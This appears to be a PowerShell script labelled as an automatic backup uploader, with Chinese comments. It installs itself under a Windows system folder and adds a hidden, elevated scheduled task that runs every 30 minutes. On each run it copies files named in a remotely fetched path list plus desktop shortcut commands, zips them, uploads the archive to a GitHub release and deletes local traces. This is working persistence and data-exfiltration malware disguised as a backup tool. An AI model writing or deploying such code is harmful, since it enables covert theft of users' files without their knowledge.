# install-console.ps1

# ========== 部署和注册计划任务 ==========

$taskName = "console"
$tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
$xmlPath = "$env:TEMP\$taskName.xml"

# 首次执行时自动部署
if ($MyInvocation.MyCommand.Path -ne $tempScript) {
    if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
        New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
    }

    Remove-Item $tempScript,$xmlPath -Force -ErrorAction SilentlyContinue

    # 下载主脚本（就是当前这份自己）
    try {
        $wc = New-Object System.Net.WebClient
        $url = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1"
        $bytes = $wc.DownloadData($url)
        $content = [System.Text.Encoding]::UTF8.GetString($bytes)
        [System.IO.File]::WriteAllText($tempScript, $content, [System.Text.Encoding]::UTF8)
    } catch {
        Write-Host "❌ 脚本下载失败：$($_.Exception.Message)"
        exit 1
    }

    # 创建计划任务 XML
    $xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Upload Task Script</Description></RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2005-01-01T19:30:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
      <Repetition><Interval>PT30M</Interval><Duration>PT4H30M</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$tempScript"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
    $xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath
    schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null

    # 立即执行一次
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
        -WindowStyle Hidden
    exit 0
}

# ========== 上传主逻辑部分（原 console.ps1） ==========

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "rtyuiuiop/1"
$token = $env:GITHUB_TOKEN
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$apiUrl = "https://api.github.com/repos/$repo/releases"
$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"

try {
    $paths = Invoke-WebRequest -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    $paths = $paths -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Write-Host "✅ 成功获取路径列表："
    $paths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法获取路径配置文件：$($_.Exception.Message)"
    exit 1
}

$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

foreach ($path in $paths) {
    if (Test-Path $path) {
        try {
            $relative = $path -replace "^[A-Z]:\\", "" -replace "[:\\]", "_"
            $dest = Join-Path $workDir $relative
            New-Item -ItemType Directory -Path (Split-Path $dest) -Force -ErrorAction SilentlyContinue | Out-Null
            Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Warning "⚠️ 无法复制：$path"
        }
    } else {
        Write-Warning "❌ 路径不存在：$path"
    }
}

# 提取快捷方式参数
try {
    $desktopDirs = @("$env:USERPROFILE\Desktop", "$env:PUBLIC\Desktop")
    $lnkInfo = ""
    foreach ($dir in $desktopDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -Filter *.lnk -Force | ForEach-Object {
                try {
                    $shell = New-Object -ComObject WScript.Shell
                    $shortcut = $shell.CreateShortcut($_.FullName)
                    $fullCmd = "`"$($shortcut.TargetPath)`" $($shortcut.Arguments)"
                    $lnkInfo += "$($_.Name)`n$fullCmd`n`n"
                } catch {
                    $lnkInfo += "$($_.Name)`n[Failed to parse]`n`n"
                }
            }
        }
    }
    if ($lnkInfo) {
        $lnkInfo | Out-File -FilePath (Join-Path $workDir "lnk_full_paths.txt") -Encoding UTF8
    }
} catch {
    Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
}

# 压缩并上传
$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

$releaseBody = @{
    tag_name = $tag
    name     = "Backup $tag"
    body     = "自动上传的备份文件"
    draft    = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $releaseBody
    if ($response.upload_url) {
        $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
        $uploadHeaders = @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
        }
        Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
        Write-Host "`n✅ 上传成功：$tag.zip"
    } else {
        Write-Host "❌ 创建 Release 失败：$($response | ConvertTo-Json -Depth 5)"
    }
} catch {
    Write-Warning "❌ 上传出错：$($_.Exception.Message)"
}

Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
